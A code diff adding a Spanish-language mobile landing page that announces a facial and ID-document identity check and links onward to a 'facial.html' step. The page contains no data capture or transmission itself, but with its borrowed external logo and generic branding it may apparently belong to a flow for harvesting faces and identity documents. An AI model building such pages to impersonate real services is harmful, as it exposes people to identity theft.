@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificar Identidad</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #edeef0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 480px;
+      min-height: 100vh;
+      background: #edeef0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 52px 32px 40px;
+    }
+
+    /* LOGO */
+    .logo-wrap { margin-bottom: 40px; }
+    .logo-wrap img {
+      height: 130px;
+      object-fit: contain;
+      display: block;
+    }
+
+    /* TITLE */
+    h1 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+      text-align: center;
+      margin-bottom: 44px;
+      letter-spacing: -0.2px;
+    }
+
+    /* HERO IMAGE */
+    .hero-img {
+      width: 240px;
+      height: 240px;
+      object-fit: contain;
+      margin-bottom: 52px;
+      flex-shrink: 0;
+    }
+
+    /* BODY TEXT */
+    .body-text {
+      font-size: 15px;
+      color: #3a3a3a;
+      text-align: center;
+      line-height: 1.7;
+      max-width: 340px;
+    }
+    .body-text strong {
+      font-weight: 800;
+      color: #1a1a1a;
+    }
+
+    .spacer { flex: 1; }
+
+    /* BUTTON */
+    .btn-continuar {
+      display: block;
+      width: 100%;
+      padding: 17px;
+      background: linear-gradient(to right, #e8003d, #c0002e);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      text-align: center;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      letter-spacing: 0.2px;
+      text-decoration: none;
+      margin-top: 48px;
+      box-shadow: 0 4px 18px rgba(220, 0, 50, 0.32);
+      transition: opacity 0.15s, transform 0.15s;
+    }
+    .btn-continuar:hover  { opacity: 0.92; transform: translateY(-1px); }
+    .btn-continuar:active { opacity: 1;    transform: translateY(0); }
+
+    /* iOS home bar */
+    .home-bar {
+      width: 134px; height: 5px;
+      background: #a0a0a8;
+      border-radius: 3px;
+      margin-top: 28px;
+      opacity: 0.4;
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+
+    <!-- LOGO: pon logo.png en la misma carpeta -->
+    <div class="logo-wrap">
+      <img src="https://www.stickersremotos.com/svg/di/34vbg1u8qwaz5e0.webp" alt="Logo"
+        onerror="this.style.display='none'; document.getElementById('lf').style.display='block'"/>
+      <div id="lf" style="display:none; font-size:22px; font-weight:800; color:#e8003d;">Mi App</div>
+    </div>
+
+    <!-- TITLE -->
+    <h1>Verificaremos tu identidad</h1>
+
+    <!-- HERO IMAGE -->
+    <img class="hero-img" src="hero.png" alt="Verificación de identidad"/>
+
+    <!-- BODY TEXT -->
+    <p class="body-text">
+      Ahora reconoceremos <strong>tu rostro</strong> y
+      <strong>documento físico de identidad por seguridad.</strong>
+      Por favor, limpie las cámaras de su celular y ubíquese
+      en un lugar iluminado.
+    </p>
+
+    <div class="spacer"></div>
+
+    <!-- CTA BUTTON → va a cedula.html -->
+    <a class="btn-continuar" href="facial.html">Continuar</a>
+
+    <div class="home-bar"></div>
+  </div>
+</body>
+</html>
